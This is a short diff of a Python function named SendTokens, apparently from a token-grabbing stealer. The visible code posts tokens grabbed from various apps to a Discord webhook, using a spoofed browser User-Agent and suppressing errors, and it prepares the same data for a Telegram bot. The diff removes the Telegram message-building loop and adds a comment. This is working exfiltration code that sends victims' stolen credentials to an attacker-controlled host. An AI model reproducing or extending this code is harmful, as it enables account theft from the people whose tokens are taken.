@@ -238,9 +238,6 @@ def SendTokens(send_settings : dict, grabbed : dict = None):
     data['discord'] = [{'description' : ''}]
     data['telegram'] = ''
 
-    #generate message
-    for app in list(grabbed.keys()):
-        data['telegram'] += f'\n[Grabbed From {app}]\n'+ '\n\n'.join(grabbed[app]) + '\n'
     #send message to discord
     if 'discord' in list(send_settings.keys()):
         if "style" in send_settings['discord']:
@@ -254,6 +251,7 @@ def SendTokens(send_settings : dict, grabbed : dict = None):
             urlopen(Request(send_settings['discord']['webhook'], data=json.dumps({"embeds" : data['discord']}).encode(), headers={'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}))
         except:
             pass
+    #send message to telegram
     if 'telegram' in list(send_settings.keys()): # to telegram
         if len(send_settings['telegram']) == 3:
             bot_token = send_settings['telegram'][0]
